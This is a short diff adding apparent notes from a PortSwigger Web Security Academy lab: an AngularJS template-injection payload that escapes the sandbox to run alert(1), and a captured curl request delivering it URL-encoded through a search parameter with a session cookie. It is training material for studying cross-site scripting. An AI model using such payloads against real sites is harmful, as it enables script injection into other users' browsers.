@@ -1,0 +1,8 @@
+
+
+{{$on.constructor('alert(1)')()}}
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0ac6006e0405514c82d2705b00a20013.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0ac6006e0405514c82d2705b00a20013.web-security-academy.net/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' -H $'Connection: keep-alive' \
+    -b $'session=nqBlC88HjXOcQXxokVITbEfBFJmbg1xZ' \
+    $'https://0ac6006e0405514c82d2705b00a20013.web-security-academy.net/?search=%7b%7b$on%2econstructor(\'alert(1)\')()%7d%7d'
